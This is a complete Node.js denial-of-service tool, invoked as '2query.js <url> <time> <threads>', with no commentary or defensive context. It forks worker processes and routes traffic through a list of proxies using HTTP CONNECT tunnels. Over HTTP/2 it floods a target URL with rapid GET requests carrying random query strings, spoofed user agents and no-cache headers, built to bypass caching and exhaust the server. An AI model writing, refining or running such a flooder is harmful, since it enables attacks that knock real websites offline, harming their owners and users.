const fs = require("fs");
const url = require("url");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");

if (process.argv.length !== 5) {
  console.log(`Usage: node 2query.js <url> <time> <threads>`);
  process.exit(0);
}

const target = process.argv[2];
const duration = Number(process.argv[3]);
const threads = Number(process.argv[4]);

const parsed = url.parse(target);
const proxies = fs.readFileSync("proxies.txt", "utf8").split("\n").filter(Boolean);
const UAs = fs.readFileSync("user-agents.txt", "utf8").split("\n").filter(Boolean);

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

function randStr(min, max) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const len = Math.floor(Math.random() * (max - min + 1)) + min;
  let out = "";
  for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
  return out;
}

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

if (cluster.isPrimary) {
  for (let i = 0; i < threads; i++) cluster.fork();
  setTimeout(() => process.exit(0), duration * 1000);
} else {
  setInterval(() => startFlood(), 1);
}

function startFlood() {
  const proxy = pick(proxies).split(":");
  const phost = proxy[0];
  const pport = Number(proxy[1]);

  const socket = tls.connect({
    host: phost,
    port: pport,
    servername: parsed.host,
    rejectUnauthorized: false,
    ALPNProtocols: ["http/1.1"],
    timeout: 8000
  });

  socket.once("secureConnect", () => {
    socket.write(
      `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\nConnection: keep-alive\r\n\r\n`
    );
  });

  socket.on("data", (data) => {
    if (!data.toString().includes("200")) {
      socket.destroy();
      return;
    }

    const tlsConn = tls.connect({
      socket: socket,
      servername: parsed.host,
      rejectUnauthorized: false,
      ALPNProtocols: ["h2"]
    });

    tlsConn.once("secureConnect", () => {
      const client = http2.connect(target, {
        createConnection: () => tlsConn
      });

      client.on("error", () => client.destroy());

      const int = setInterval(() => {
        for (let i = 0; i < 100; i++) {
          const path = parsed.path + "?query=" + randStr(5, 25);
          const req = client.request({
            ":method": "GET",
            ":path": path,
            ":authority": parsed.host,
            "user-agent": pick(UAs),
            "accept": "*/*",
            "cache-control": "no-cache"
          });
          req.on("error", () => {});
          req.end();
        }
      }, 200);

      setTimeout(() => {
        clearInterval(int);
        client.destroy();
        tlsConn.destroy();
        socket.destroy();
      }, 5000);
    });
  });

  socket.on("error", () => socket.destroy());
  socket.on("timeout", () => socket.destroy());
}
